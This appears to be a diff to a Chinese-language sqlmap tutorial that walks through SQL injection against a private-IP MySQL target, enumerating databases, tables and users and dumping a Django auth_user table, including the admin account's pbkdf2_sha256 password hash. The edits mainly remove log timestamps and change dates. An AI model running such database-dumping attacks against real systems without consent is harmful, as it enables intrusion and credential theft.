@@ -340,7 +340,6 @@ cd 目录，查看使用方法
 	back-end DBMS: MySQL >= 5.0
 	[11:26:38] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
 	
-	[*] ending @ 11:26:38 /2019-08-16/
 
 ### 2.3 获取数据库 --dbs --current-db
 
@@ -374,8 +373,6 @@ cd 目录，查看使用方法
 	
 	[11:46:17] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
 	
-	[*] ending @ 11:46:17 /2019-08-16/
-
 
 
 ### 2.4 查询数据库的表 --tables
@@ -430,7 +427,6 @@ cd 目录，查看使用方法
 	
 	[14:17:31] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
 	
-	[*] ending @ 14:17:31 /2019-08-16/
 
 ### 2.5 查询表的数据项 --columns
 
@@ -460,7 +456,6 @@ cd 目录，查看使用方法
 	
 	[14:19:45] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
 	
-	[*] ending @ 14:19:45 /2019-08-16/
 
 ### 2.6 查询数据库用户与密码 --users --passwords
 
@@ -472,7 +467,6 @@ cd 目录，查看使用方法
 	
 	[14:21:05] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
 	
-	[*] ending @ 14:21:05 /2019-08-16/
 	
 
 ### 2.7 获取数据库表内容 ----dump
@@ -487,7 +481,6 @@ cd 目录，查看使用方法
 	
 	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 	
-	[*] starting @ 14:26:10 /2019-08-16/
 	
 	[14:26:10] [INFO] resuming back-end DBMS 'mysql'
 	[14:26:10] [INFO] testing connection to the target URL
@@ -520,13 +513,12 @@ cd 目录，查看使用方法
 	+----+---------+----------+--------------------------------------------------------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
 	| id | email   | is_staff | password                                                                       | username | is_active | last_name | first_name | last_login                 | date_joined                | is_superuser |
 	+----+---------+----------+--------------------------------------------------------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
-	| 1  | <blank> | 1        | pbkdf2_sha256$150000$lhjdsKJQwYZv$Sn5w4isWqUbzQxG9RcbsuDdbo5Gd8S0FqQ9dWiCpBO0= | admin    | 1         | <blank>   | <blank>    | 2019-08-14 18:16:53.846708 | 2019-07-26 11:56:54.734852 | 1            |
+	| 1  | <blank> | 1        | pbkdf2_sha256$150000$lhjdsKJQwYZv$Sn5w4isWqUbzQxG9RcbsuDdbo5Gd8S0FqQ9dWiCpBO0= | admin    | 1         | <blank>   | <blank>    | 2018-04-14 18:16:53.846708 | 2018-03-26 11:56:54.734852 | 1            |
 	+----+---------+----------+--------------------------------------------------------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
 	
 	[14:26:11] [INFO] table 'itapidb.auth_user' dumped to CSV file '/Users/didi/.sqlmap/output/172.20.201.203/dump/itapidb/auth_user.csv'
 	[14:26:11] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
 	
-	[*] ending @ 14:26:11 /2019-08-16/
 	
 可以直接将数据库表的内容dump下来，发现存在`admin`用户，密码是经过`Django` `pbkdf2_sha256`加密的。
 
